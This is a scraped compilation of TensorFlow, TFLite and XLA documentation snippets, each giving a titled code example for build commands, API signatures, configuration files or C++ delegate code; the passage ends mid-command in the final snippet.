TITLE: Building TFLite Python Package (Native) - Shell
DESCRIPTION: Command to build the TensorFlow Lite Python `tflite_runtime` package for the native workstation architecture using the `build_pip_package_with_cmake.sh` script. This requires CMake and the TensorFlow source code. The `PYTHON` variable is used to specify the desired Python 3 interpreter (3.7 or higher). The expected output is the generated PIP package file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_pip.md#_snippet_0

LANGUAGE: sh
CODE:
```
PYTHON=python3 tensorflow/lite/tools/pip_package/build_pip_package_with_cmake.sh native
```

----------------------------------------

TITLE: Running the Quantization Debugger (Python)
DESCRIPTION: Executes the quantization debugging process configured with specific options and a representative dataset. This step triggers the calculation of standard and custom metrics for analyzing quantization effects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
debugger.run()
```

----------------------------------------

TITLE: Building TensorFlow Label Image Demo with Bazel Bash
DESCRIPTION: This Bazel command builds the TensorFlow label image example project located at the specified path. It compiles the C++ code and potentially packages the Python script, creating executable binaries in the bazel-bin directory. Requires the Bazel build system to be installed and configured.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel build tensorflow/examples/label_image/...
```

----------------------------------------

TITLE: Excluding Flex Ops Sources CMake
DESCRIPTION: Filters out source files related to the Flex (selected ops) implementation from the `TFLITE_SRCS` list. It removes any file matching the regular expression `.*with_selected_ops\.cc$` to build a TensorFlow Lite library without these specific operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_24

LANGUAGE: CMake
CODE:
```
# Exclude Flex related files.
list(FILTER TFLITE_SRCS EXCLUDE REGEX ".*with_selected_ops\\.cc$")
```

----------------------------------------

TITLE: Selecting Plugin Platform JAX Python
DESCRIPTION: Demonstrates how to explicitly set the desired JAX platform using `jax.config.update("jax_platforms", "my_plugin")`. Running this line ensures that JAX attempts to load and use the specified plugin, helping to verify successful registration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_7

LANGUAGE: python
CODE:
```
jax.config.update("jax_platforms", "my_plugin")
```

----------------------------------------

TITLE: Accessing Name in ModelMetadata
DESCRIPTION: Retrieves the name string assigned to the model metadata. This method returns the identifying name of the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_11

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Building TFLite Benchmark Tool with TF Ops Support (Android arm64)
DESCRIPTION: This Bazel command builds the `benchmark_model_plus_flex` tool for Android arm64 devices. It uses the `--config=monolithic` and `--config=android_arm64` flags to include dependencies and target the specific architecture for the binary with select TensorFlow operator support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/README.md#_snippet_2

LANGUAGE: Bazel
CODE:
```
bazel build -c opt \
  --config=monolithic --config=android_arm64 \
  tensorflow/lite/tools/benchmark:benchmark_model_plus_flex
```

----------------------------------------

TITLE: Defining JAX Plugin Entry Point setup.py
DESCRIPTION: Example demonstrating how to define a JAX plugin entry point within a `setup.py` file using the `entry_points` argument. This provides an alternative method to pyproject.toml for making your plugin module discoverable by the JAX framework.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_5

LANGUAGE: python
CODE:
```
# use setup.py
entry_points={
  "jax_plugins": [
    "my_plugin = my_plugin",
  ],
}
```

----------------------------------------

TITLE: Initializing Recommendation Class Python
DESCRIPTION: Initializes a `Recommendation` object. This constructor sets up the core parameters needed to configure the recommendation model, including the model specification, output directory, data shuffling preference, learning rate, and gradient clipping norm. These parameters influence the training process and model behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.recommendation.Recommendation(
    model_spec,
    model_dir,
    shuffle=True,
    learning_rate=0.1,
    gradient_clip_norm=1.0
)
```

----------------------------------------

TITLE: Rewriting Function Call with AutoGraph Wrapper - Python
DESCRIPTION: Shows the internal structure of a function call after AutoGraph conversion. The original call is wrapped within `ag__.converted_call` to enable runtime conversion and caching logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/functions.md#_snippet_1

LANGUAGE: python
CODE:
```
ag__.converted_call(f, ..., (x, y), {'z': 1}, ...)
```

----------------------------------------

TITLE: Listing StatusOr Helper API (C++)
DESCRIPTION: This snippet lists a C++ helper symbol for the `StatusOr` type from the `//tensorflow/core/platform:statusor` build target. Specifically, it references a crashing helper method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_2

LANGUAGE: C++
CODE:
```
tensorflow::internal_statusor::Helper::Crash
```

----------------------------------------

TITLE: MLIR stablehlo.custom_call Basic Syntax
DESCRIPTION: An example of a basic `stablehlo.custom_call` operation in MLIR. It defines a custom operation named "foo" with a specific API version, taking one tensor argument and producing one tensor result of the same shape and type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_1

LANGUAGE: MLIR
CODE:
```
%0 = "stablehlo.custom_call"(%arg0) {
  call_target_name = "foo",
  api_version = 4 : i32
} : (tensor<2x2xf32>) -> tensor<2x2xf32>
```

----------------------------------------

TITLE: Modifying Static Python Object Field in Control Flow Python
DESCRIPTION: Demonstrates that modifying a field of a Python object is allowed inside control flow if the object's structure (fields) is static. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_29

LANGUAGE: Python
CODE:
```
static_object = MyClass()
static_object.field = tf.constant(3)
while static_object.field > 0:
  static_object.field -= 1  # Okay -- static_object does not change structure
```

----------------------------------------

TITLE: Initializing Stats Object in Python
DESCRIPTION: This instance method initializes the `Stats` object with the provided FlatBuffers buffer and position. It sets up the object to correctly access data within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_2

LANGUAGE: Python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Getting DataLoader Size (__len__) - Python
DESCRIPTION: Returns the size of the dataset associated with the DataLoader instance. This is the length of the dataset that was provided during initialization or determined by a loading method like `from_folder`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_5

LANGUAGE: python
CODE:
```
__len__()
```

----------------------------------------

TITLE: Comparing BaseOptions Equality Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method. It takes another object (`other`) as input and returns a boolean indicating whether the current `BaseOptions` object is equal to `other`. This method is part of the class's implementation for object comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/core/BaseOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Initializing tflite_support.task.processor.ColoredLabel in Python
DESCRIPTION: Constructs a `ColoredLabel` object, defining a label with an associated RGB color for display. Requires the RGB color components, the category name from the model's label map, and an optional display name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ColoredLabel.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.ColoredLabel(
    color: Tuple[int, int, int], category_name: str, display_name: str
)
```

----------------------------------------

TITLE: TfLiteDepthwiseConvParams C Struct (Versioned)
DESCRIPTION: This snippet shows the updated C structure `TfLiteDepthwiseConvParams` with the addition of `dilation_width_factor` and `dilation_height_factor`. Comments are included to indicate the version support for the parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_3

LANGUAGE: C
CODE:
```
typedef struct {
  // Parameters for DepthwiseConv version 1 or above.
  TfLitePadding padding;
  int stride_width;
  int stride_height;
  int depth_multiplier;
  TfLiteFusedActivation activation;
  // Parameters for DepthwiseConv version 2 or above.
  int dilation_width_factor;
  int dilation_height_factor;
} TfLiteDepthwiseConvParams;
```

----------------------------------------

TITLE: Importing TensorFlow and Checking Version (Python)
DESCRIPTION: Imports the TensorFlow library and prints the installed version to verify that the correct package was installed successfully. This helps confirm the environment is set up correctly before proceeding with the conversion steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf
print("TensorFlow version:", tf.__version__)
```

----------------------------------------

TITLE: Running Sanity Check using ci_build.sh - Bash
DESCRIPTION: Executes a sanity check script using the TensorFlow CI build tools, typically within a Docker container managed by `ci_build.sh`. This helps identify common issues like licensing, Python coding style violations, and BUILD file errors early in the development process. Requires Docker.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_5

LANGUAGE: bash
CODE:
```
tensorflow/tools/ci_build/ci_build.sh CPU tensorflow/tools/ci_build/ci_sanity.sh
```

----------------------------------------

TITLE: Getting Input Tensor Shape - TFLite Support - Python
DESCRIPTION: Retrieves the shape of a specific input tensor from a TFLite model byte buffer. It takes the model buffer (`model_buffer`) and the index of the input tensor (`tensor_index`) as parameters and returns an array representing the tensor's shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_input_tensor_shape.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_input_tensor_shape(
    model_buffer: bytearray, tensor_index: int
) -> array.array
```

----------------------------------------

TITLE: Preprocessing Dataset with BrowserFftSpec (Python)
DESCRIPTION: Applies necessary preprocessing steps to a TensorFlow dataset containing audio data for training or evaluation with the BrowserFftSpec model. Takes the dataset, a boolean indicating if it's for training, and an optional cache function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_5

LANGUAGE: Python
CODE:
```
preprocess_ds(
    ds, is_training=False, cache_fn=None
)
```

----------------------------------------

TITLE: Calling Model Metadata Add Version (Python)
DESCRIPTION: This snippet shows the function signature for `ModelMetadataAddVersion` in Python. It is used to associate a version number with the model metadata being built, typically using a FlatBuffer builder object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddVersion.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddVersion(
    builder, version
)
```

----------------------------------------

TITLE: Installing CMake on Ubuntu
DESCRIPTION: Installs the CMake build tool using apt-get on Ubuntu systems. This is the first required step to build the TensorFlow Lite example. Requires root privileges.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
sudo apt-get install cmake
```

----------------------------------------

TITLE: Accept Xcode License Agreement (Shell)
DESCRIPTION: Accepts the Xcode license agreement for all users on the system, which is required after a new Xcode installation before using its tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_1

LANGUAGE: Shell
CODE:
```
sudo xcodebuild -license accept
```

----------------------------------------

TITLE: Initializing TFLite AudioFormat Object - Python
DESCRIPTION: This snippet shows the default constructor signature for creating an instance of the `AudioFormat` class within the TFLite Support library. It's used to represent the format of audio data, typically before passing it to an audio task. Requires the `tflite_support.task.audio` module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioFormat.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.audio.AudioFormat()

```

----------------------------------------

TITLE: Running Gemma2 Keras Benchmark Script (Bash)
DESCRIPTION: Executes the `run.sh` script after activating the appropriate virtual environment. This script runs the benchmark located in `benchmark.py`. The `KERAS_BACKEND` environment variable can be set to `jax`, `tensorflow`, or `torch` before running the script to specify the desired Keras backend.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/keras/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
KERAS_BACKEND=jax bash run.sh
```

----------------------------------------

TITLE: Importing Packages for Audio Classifier Metadata (Python)
DESCRIPTION: Imports the necessary Python packages from the tflite_support library to work with audio classifier metadata. This includes the specific writer class for audio classifiers (`audio_classifier`), a module for general metadata information structures (`metadata_info`), and utility functions for file operations (`writer_utils`). These imports are essential for setting up the environment to write metadata for an audio model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_15

LANGUAGE: Python
CODE:
```
from tflite_support.metadata_writers import audio_classifier
from tflite_support.metadata_writers import metadata_info
from tflite_support.metadata_writers import writer_utils
```

----------------------------------------

TITLE: Set Podspec Version (Podspec)
DESCRIPTION: Sets the version tag for a private CocoaPods podspec file, necessary when publishing a custom version of a library like TensorFlowLiteC.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_10

LANGUAGE: Ruby
CODE:
```
s.version      = <your_desired_version_tag>
```

----------------------------------------

TITLE: Zipping and Downloading Generated Code (Python)
DESCRIPTION: Python code snippet for use in environments like Google Colab to zip the generated code directory and download the resulting zip archive for easy transfer to an Android Studio project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_5

LANGUAGE: Python
CODE:
```
# Zip up the generated code
!zip -r classify_wrapper.zip classify_wrapper/

# Download the archive
from google.colab import files
files.download('classify_wrapper.zip')
```

----------------------------------------

TITLE: Adding Custom Metadata Name using TFLite Support Python
DESCRIPTION: This function is part of the generated Python code for the TFLite metadata schema. It is typically used internally to add a 'name' field to a custom metadata entry within a FlatBuffers builder object during the serialization process. It requires a FlatBuffers `builder` and the `name` string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataAddName.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataAddName(
    builder, name
)
```

----------------------------------------

TITLE: Importing Packages for Detailed Image Classifier Metadata (Python)
DESCRIPTION: Imports the necessary Python packages for creating rich semantic metadata for image classification models. This includes the specific writer class (`image_classifier`), structures for metadata information (`metadata_info`), utility functions (`writer_utils`), and the FlatBuffers schema definitions (`_metadata_fb`). These imports enable the creation of detailed metadata using the 'create_from_metadata_info' method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_18

LANGUAGE: Python
CODE:
```
from tflite_support.metadata_writers import image_classifier
from tflite_support.metadata_writers import metadata_info
from tflite_support.metadata_writers import writer_utils
from tflite_support import metadata_schema_py_generated as _metadata_fb
```

----------------------------------------

TITLE: Creating Keras Model Python
DESCRIPTION: This method returns the underlying Keras model instance used by the object detector task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_2

LANGUAGE: python
CODE:
```
create_model() -> tf.keras.Model
```

----------------------------------------

TITLE: Defining Default TFLite GPU Delegate Options (V1 C++)
DESCRIPTION: This C++ snippet shows the structure and default values for the TFLite GPU delegate options in an earlier version (V1). It lists common options like `allow_precision_loss`, `wait_type`, and `enable_quantization` and their default states.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/gpu/README.md#_snippet_4

LANGUAGE: c++
CODE:
```
const TFLGpuDelegateOptions kDefaultOptions = {
  .allow_precision_loss = false,
  .wait_type = TFLGpuDelegateWaitTypePassive,
  .enable_quantization = false,
};
```

----------------------------------------

TITLE: Saving Trained Weights with TFLite Signature Java
DESCRIPTION: Demonstrates how to save the trained weights from the TensorFlow Lite Java interpreter to a checkpoint file using the 'save' signature. It calls `runSignature` with the checkpoint file path as an input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_16

LANGUAGE: java
CODE:
```
try (Interpreter interpreter = new Interpreter(modelBuffer)) {
    // Conduct the training jobs.

    // Export the trained weights as a checkpoint file.
    File outputFile = new File(getFilesDir(), "checkpoint.ckpt");
    Map<String, Object> inputs = new HashMap<>();
    inputs.put("checkpoint_path", outputFile.getAbsolutePath());
    Map<String, Object> outputs = new HashMap<>();
    interpreter.runSignature(inputs, outputs, "save");
}
```

----------------------------------------

TITLE: Configure Ccache for Build Acceleration
DESCRIPTION: Allows enabling and configuring ccache for faster builds. It finds the ccache program and sets global compile rules if enabled, providing options for cache size and directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
# Build with ccache if the package is present
set(LLVM_CCACHE_BUILD OFF CACHE BOOL "Set to ON for a ccache enabled build")
if(LLVM_CCACHE_BUILD)
  find_program(CCACHE_PROGRAM ccache)
  if(CCACHE_PROGRAM)
      set(LLVM_CCACHE_MAXSIZE "" CACHE STRING "Size of ccache")
      set(LLVM_CCACHE_DIR "" CACHE STRING "Directory to keep ccached data")
      set(LLVM_CCACHE_PARAMS "CCACHE_CPP2=yes CCACHE_HASHDIR=yes"
          CACHE STRING "Parameters to pass through to ccache")

      set(CCACHE_PROGRAM "${LLVM_CCACHE_PARAMS} ${CCACHE_PROGRAM}")
      if (LLVM_CCACHE_MAXSIZE)
        set(CCACHE_PROGRAM "CCACHE_MAXSIZE=${LLVM_CCACHE_MAXSIZE} ${CCACHE_PROGRAM}")
      endif()
      if (LLVM_CCACHE_DIR)
        set(CCACHE_PROGRAM "CCACHE_DIR=${LLVM_CCACHE_DIR} ${CCACHE_PROGRAM}")
      endif()
      set_property(GLOBAL PROPERTY RULE_LAUNCH_COMPILE ${CCACHE_PROGRAM})
  else()
    message(FATAL_ERROR "Unable to find the program ccache. Set LLVM_CCACHE_BUILD to OFF")
  endif()
endif()
```

----------------------------------------

TITLE: Getting ProcessUnit Options Python
DESCRIPTION: Returns the options associated with the `ProcessUnit`. The type of the returned options object depends on the `OptionsType` field of the `ProcessUnit`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_3

LANGUAGE: python
CODE:
```
Options()
```

----------------------------------------

TITLE: Running Scripts for TF-oneDNN Benchmark Comparison
DESCRIPTION: These commands first execute the `download_models.sh` script to ensure models are available, and then run `run_onednn_benchmarks.sh`. The second script performs benchmark comparisons between vanilla TensorFlow and TF-oneDNN, typically generating a results summary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_7

LANGUAGE: Bash
CODE:
```
bash download_models.sh
bash run_onednn_benchmarks.sh
```

----------------------------------------

TITLE: Renaming and Verifying Built Wheel Packages Bash
DESCRIPTION: Executes a utility script inside the Docker container to check for manylinux compliance, rename the generated wheel packages, and perform size checks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_6

LANGUAGE: Bash
CODE:
```
docker exec tf /usertools/rename_and_verify_wheels.sh
```

----------------------------------------

TITLE: Initializing ModelMetadataT from Object (Python)
DESCRIPTION: A class method to initialize a `ModelMetadataT` object from another `modelMetadata` object. This might be used for copying or conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    modelMetadata
)

```

----------------------------------------

TITLE: Lowering Log Softmax (MLIR/TOSA IR)
DESCRIPTION: Lowers a LogSoftmax operation to TOSA. It computes `log(softmax(logits))` by first calculating the exponentiation of the input (`tosa.EXP`), reducing the sum along the last axis (`tosa.REDUCE_SUM`), taking the reciprocal of the sum, multiplying the exponentiated input by the reciprocal, and finally taking the logarithm (`tosa.LOG`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_14

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_log_softmax_op(Value %logits)
{
    %op1 = tosa.EXP(%logits)
    %op2 = tosa.REDUCE_SUM(%op1) {axis=(%logits.rank-1)}
    %op3 = tosa.RECIPROCAL(%op2)
    %op4 = tosa.MUL(%op1, %op3)
    %op5 = tosa.LOG(%op4)

    return %op5
}
```

----------------------------------------

TITLE: Downloading Audio Classifier Example Files (Shell)
DESCRIPTION: Uses shell commands (`!curl`) to download the required example files for the audio classifier metadata task. It fetches the TFLite model file (`yamnet.tflite`) and the label file (`yamnet_labels.txt`) from their respective GitHub locations. These downloaded files are used as input for the subsequent metadata population process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_16

LANGUAGE: Shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/audio_classifier/yamnet_wavin_quantized_mel_relu6.tflite -o yamnet.tflite
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/audio_classifier/yamnet_521_labels.txt -o yamnet_labels.txt


```

----------------------------------------

TITLE: Get Standard Deviation Value by Index Python
DESCRIPTION: This method retrieves a single floating-point standard deviation value from the normalization options at the specified index `j`. It allows accessing elements of the standard deviation array one by one.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_8

LANGUAGE: Python
CODE:
```
Std(
    j
)
```

----------------------------------------

TITLE: Get Standard Deviation Array Length Python
DESCRIPTION: This method returns the number of elements in the standard deviation array. It indicates the dimensionality of the standard deviation values provided in the normalization options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_11

LANGUAGE: Python
CODE:
```
StdLength()
```

----------------------------------------

TITLE: Checking ModelMetadata Buffer Identifier (Class Method)
DESCRIPTION: A class method to check if the FlatBuffers buffer contains the correct identifier for ModelMetadata. This validates the buffer's content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_10

LANGUAGE: python
CODE:
```
@classmethod
ModelMetadataBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Getting Root Object from Buffer - TFLite Metadata Python
DESCRIPTION: This class method initializes and returns the root object of the `ScoreCalibrationOptions` FlatBuffer from the provided buffer (`buf`) at a specified offset. It is a standard way to deserialize FlatBuffer data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)

```

----------------------------------------

TITLE: Implementing External TFLite Delegate Adaptor (C++)
DESCRIPTION: This C++ code provides an adaptor for the dummy delegate to work as an external delegate. It includes a function `CreateDummyDelegateFromOptions` to parse options and the `extern "C"` required entry points (`tflite_plugin_create_delegate`, `tflite_plugin_destroy_delegate`) for the TFLite external delegate plugin interface.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_6

LANGUAGE: C++
CODE:
```
TfLiteDelegate* CreateDummyDelegateFromOptions(char** options_keys,
                                               char** options_values,
                                               size_t num_options) {
  DummyDelegateOptions options = TfLiteDummyDelegateOptionsDefault();

  // Parse key-values options to DummyDelegateOptions.
  // You can achieve this by mimicking them as command-line flags.
  std::unique_ptr<const char*> argv =
      std::unique_ptr<const char*>(new const char*[num_options + 1]);
  constexpr char kDummyDelegateParsing[] = "dummy_delegate_parsing";
  argv.get()[0] = kDummyDelegateParsing;

  std::vector<std::string> option_args;
  option_args.reserve(num_options);
  for (int i = 0; i < num_options; ++i) {
    option_args.emplace_back("--");
    option_args.rbegin()->append(options_keys[i]);
    option_args.rbegin()->push_back('=');
    option_args.rbegin()->append(options_values[i]);
    argv.get()[i + 1] = option_args.rbegin()->c_str();
  }

  // Define command-line flags.
  // ...
  std::vector<tflite::Flag> flag_list = {
      tflite::Flag::CreateFlag(...),
      ...,
      tflite::Flag::CreateFlag(...),
  };

  int argc = num_options + 1;
  if (!tflite::Flags::Parse(&argc, argv.get(), flag_list)) {
    return nullptr;
  }

  return TfLiteDummyDelegateCreate(&options);
}

#ifdef __cplusplus
extern "C" {
#endif  // __cplusplus

// Defines two symbols that need to be exported to use the TFLite external
// delegate. See tensorflow/lite/delegates/external for details.
TFL_CAPI_EXPORT TfLiteDelegate* tflite_plugin_create_delegate(
    char** options_keys, char** options_values, size_t num_options,
    void (*report_error)(const char*)) {
  return tflite::tools::CreateDummyDelegateFromOptions(
      options_keys, options_values, num_options);
}

TFL_CAPI_EXPORT void tflite_plugin_destroy_delegate(TfLiteDelegate* delegate) {
  TfLiteDummyDelegateDelete(delegate);
}

#ifdef __cplusplus
}
#endif  // __cplusplus
```

----------------------------------------

TITLE: Configuring Bazel for Performance Build (bazelrc)
DESCRIPTION: These configuration settings are intended for a Bazel `.bazelrc` file to optimize build performance, particularly on systems with abundant resources like a 96-core GCE VM. They adjust JVM memory parameters, garbage collection, concurrency levels, resource limits, explicitly select the `@local_config_clang6//clang6` crosstool, and apply performance flags like `-march=native` to host and target compilations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/toolchains/clang6/README.md#_snippet_1

LANGUAGE: bazelrc
CODE:
```
startup --host_jvm_args=-Xmx30G
startup --host_jvm_args=-Xms30G
startup --host_jvm_args=-XX:MaxNewSize=3g
startup --host_jvm_args=-XX:-UseAdaptiveSizePolicy
startup --host_jvm_args=-XX:+UseConcMarkSweepGC
startup --host_jvm_args=-XX:TargetSurvivorRatio=70
startup --host_jvm_args=-XX:SurvivorRatio=6
startup --host_jvm_args=-XX:+UseCMSInitiatingOccupancyOnly
startup --host_jvm_args=-XX:CMSFullGCsBeforeCompaction=1
startup --host_jvm_args=-XX:CMSInitiatingOccupancyFraction=75

build --jobs=100
build --local_resources=200000,100,100
build --crosstool_top=@local_config_clang6//clang6
build --noexperimental_check_output_files
build --nostamp
build --config=opt
build --noexperimental_check_output_files
build --copt=-march=native
build --host_copt=-march=native
```

----------------------------------------

TITLE: Importing TFLite Module in Swift
DESCRIPTION: Imports the necessary TensorFlowLite module to access its APIs for model inference in Swift applications. This is the first required step before loading and running a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_8

LANGUAGE: Swift
CODE:
```
import TensorFlowLite
```

----------------------------------------

TITLE: Deprecated Get Root As ScoreThresholdingOptions - Python
DESCRIPTION: A deprecated class method to retrieve the root `ScoreThresholdingOptions` object from a buffer. Users are advised to use the non-deprecated `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAsScoreThresholdingOptions(
    buf, offset=0
)
```

----------------------------------------

TITLE: Evaluating MobileBERT Text Classification Model in Python
DESCRIPTION: Evaluates the trained MobileBERT text classification model's performance using the test dataset. It returns the loss and accuracy metrics specific to the MobileBERT model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
loss, acc = model.evaluate(test_data)
```

----------------------------------------

TITLE: Initializing RegexTokenizerOptions with Buffer and Position Python
DESCRIPTION: Initializes the `RegexTokenizerOptions` object using a FlatBuffers buffer and a starting position. This method is typically called internally after retrieving the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_3

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Run Multi-Node HLO Runner with SLURM Bash
DESCRIPTION: This command demonstrates how to execute the XLA multi-host HLO runner within a SLURM job environment. It passes SLURM environment variables (`SLURM_PROCID` for task ID, `SLURM_NTASKS` for total nodes, `SLURM_LAUNCH_NODE_IPADDR` for address) to the runner, allowing it to coordinate across multiple nodes allocated by SLURM.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_11

LANGUAGE: bash
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- \
